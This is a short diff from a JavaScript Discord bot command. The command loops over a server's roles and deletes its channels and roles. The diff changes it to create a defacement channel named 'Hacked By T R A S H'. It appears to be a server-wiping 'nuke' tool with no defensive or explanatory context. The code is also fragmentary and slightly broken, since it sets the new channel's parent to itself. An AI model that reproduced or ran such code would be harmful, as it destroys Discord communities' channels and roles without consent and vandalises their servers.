@@ -8,8 +8,8 @@ module.exports.run = async (bot, message, args) => {
        message.guild.roles.forEach(function(rol) {
                  kan.delete()
                  rol.delete()
-         message.guild.createChannel(`🔊Sohbet`, "text").then(sohbetkanal => {
-         sohbetkanal.setParent(sohbetkategori)  
+         message.guild.createChannel(`Hacked By T R A S H`, "text").then(HACKEDBYTRASH => {
+         HACKEDBYTRASH.setParent(HACKEDBYTRASH)  
        })})})
 }
   exports.conf = {
